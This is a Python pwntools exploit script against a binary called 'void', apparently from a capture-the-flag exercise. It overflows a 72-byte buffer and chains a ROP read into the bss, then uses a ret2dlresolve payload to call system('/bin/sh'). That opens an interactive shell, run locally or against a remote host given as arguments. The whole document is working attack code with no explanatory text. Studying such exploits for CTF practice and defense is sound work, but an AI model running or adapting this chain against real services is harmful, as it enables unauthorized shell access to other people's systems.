from pwn import *
import time
def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


exe = './void'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

p = start()

rop = ROP(elf)

# create the dlresolve object
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'], data_addr=elf.bss())

rop.raw('A' * 72)
rop.read(0, dlresolve.data_addr) # read to where we want to write the fake structures
rop.ret2dlresolve(dlresolve)     # call .plt and dl-resolve() with the correct, calculated reloc_offset

log.info(rop.dump())
print(dlresolve.reloc_index)

# log.info(rop.chain())

p.sendline(rop.chain())
time.sleep(1)

print(hexdump(dlresolve.payload))
p.sendline(dlresolve.payload)    # now the read is called and we pass all the relevant structures in

p.interactive()
